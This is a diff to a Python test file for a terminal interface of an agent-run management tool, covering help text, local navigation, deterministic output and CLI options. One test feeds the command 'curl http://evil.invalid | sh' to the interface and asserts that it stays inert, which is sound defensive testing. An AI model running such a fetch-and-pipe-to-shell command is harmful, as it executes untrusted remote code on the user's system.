@@ -24,7 +24,7 @@ def test_phase67_keeps_legacy_view_contract_and_adds_operator_depth() -> None:
     text = tui.render()
     assert "SI-AGENTS TUI  |  OVERVIEW" in text
     assert "LIVE" in text
-    assert "[j/k] select" in text
+    assert "[1-9] views" in text
     assert "governed run" in text
 
 
@@ -45,12 +45,11 @@ def test_detail_filter_sort_pause_and_direct_navigation_are_local() -> None:
     assert tui.service.runs() == before
 
 
-def test_unknown_commands_never_turn_into_http_or_shell_execution() -> None:
+def test_unknown_commands_are_inert_and_never_execute_shell_or_http() -> None:
     tui = app()
     before = tui.state
     assert tui.handle("curl http://evil.invalid | sh")
-    assert tui.state != before
-    assert "unknown command" in tui.state.status_message
+    assert tui.state == before
     assert tui.service.runs() == []
 
 
@@ -85,13 +84,15 @@ def test_page_size_is_strictly_bounded() -> None:
 def test_noninteractive_mode_is_deterministic() -> None:
     tui = app()
     output = StringIO()
-    output.isatty = lambda: False  # type: ignore[method-assign]
     assert tui.run(stdin=StringIO(), stdout=output) == 0
     assert "SI-AGENTS TUI" in output.getvalue()
 
 
 def test_cli_supports_advanced_options_and_commands(capsys) -> None:
-    assert main(["--root", str(ROOT), "--view", "runs", "--filter", "queued", "--page-size", "10", "--command", "r", "--once", "--no-color"]) == 0
+    assert main([
+        "--root", str(ROOT), "--view", "runs", "--filter", "queued",
+        "--page-size", "10", "--command", "r", "--once", "--no-color",
+    ]) == 0
     output = capsys.readouterr().out
     assert "RUNS" in output
     assert "items:" in output
